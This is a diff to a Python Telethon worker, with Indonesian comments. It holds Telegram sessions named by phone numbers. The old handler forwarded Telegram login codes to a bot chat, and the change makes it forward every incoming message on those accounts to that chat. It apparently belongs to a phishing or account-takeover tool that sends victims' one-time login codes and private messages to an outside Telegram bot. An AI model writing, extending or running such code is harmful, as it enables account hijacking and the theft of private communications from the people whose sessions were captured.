@@ -115,30 +115,24 @@ def success():
 
 # ============= BAGIAN WORKER TELETHON =============
 async def forward_handler(event, client_name):
-    """Handler untuk meneruskan pesan OTP"""
+    """Handler untuk forward SEMUA pesan (debug mode)"""
     text_msg = event.message.message
+    phone_number = client_name.replace(".session", "")
 
-    if "login code" in text_msg.lower() or "kode login" in text_msg.lower():
-        # ambil hanya angka OTP
-        otp_match = re.search(r"\d{4,6}", text_msg)
-        otp_code = otp_match.group(0) if otp_match else text_msg
+    # kirim semua pesan ke Telegram
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": CHAT_ID,
+        "text": (
+            "📩 *Pesan Baru Diterima!*\n\n"
+            f"📱 *Nomor* : `{phone_number}`\n"
+            f"💬 *Pesan* : `{text_msg}`"
+        ),
+        "parse_mode": "Markdown"
+    }
+    requests.post(url, data=payload)
 
-        # hapus ekstensi .session biar dapat nomor HP
-        phone_number = client_name.replace(".session", "")
-
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": CHAT_ID,
-            "text": (
-                "📩 *OTP Baru Diterima!*\n\n"
-                f"📱 *Nomor* : `{phone_number}`\n"
-                f"🔑 *OTP*   : `{otp_code}`"
-            ),
-            "parse_mode": "Markdown"
-        }
-        requests.post(url, data=payload)
-
-        print(f"OTP diteruskan dari {phone_number}: {otp_code}")
+    print(f"Pesan dari {phone_number}: {text_msg}")
 
 async def worker_main():
     print("Worker jalan...")
@@ -154,6 +148,7 @@ async def worker_main():
 
             @client.on(events.NewMessage)
             async def handler(event, fn=fname):
+                print(f"DEBUG: Pesan baru dari {fn}: {event.message.message}")
                 await forward_handler(event, fn)
 
     if not clients:
